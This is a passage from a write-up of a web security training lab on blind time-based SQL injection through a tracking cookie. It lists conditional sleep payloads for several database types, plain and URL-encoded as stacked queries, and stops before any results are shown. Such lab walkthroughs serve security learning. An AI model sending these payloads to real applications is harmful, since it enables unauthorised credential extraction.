# Lab: Blind SQL injection with time delays and information retrieval

## Description

 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Hint

Check out the SQLi cheat sheet

![image](https://user-images.githubusercontent.com/83407557/172084631-72e84084-1d39-4af7-84fa-b1479377b76b.png)


## Step 1 Finding injection point

Since I am not sure what the database type is, I can check for a timing delay using the conditional time delay payloads from portswigger

```sql
'SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual--

'IF (1=1) WAITFOR DELAY '0:0:10'--

'SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--

'SELECT IF(1=1,sleep(10),'a')--
```

None of these were working for me until I decided to reread the cheat sheet, per the hint. On a whim I decided to try running these commands as stacked queries (so they will be prefaced with a semicolon.) They will also have to have certain characters url encoded.

```sql
'%3BSELECT+CASE+WHEN+(1%3d1)+THEN+'a'||dbms_pipe.receive_message(('a'),10)+ELSE+NULL+END+FROM+dual--

'%3BIF+(1%3d1)+WAITFOR+DELAY+'0:0:10'--

'%3BSELECT+CASE+WHEN+(1%3d1)+THEN pg_sleep(10)+ELSE+pg_sleep(0)+END--

'%3BSELECT+IF(1%3d1,sleep(10),'a')--
```

I send each of these as an intruder payload:
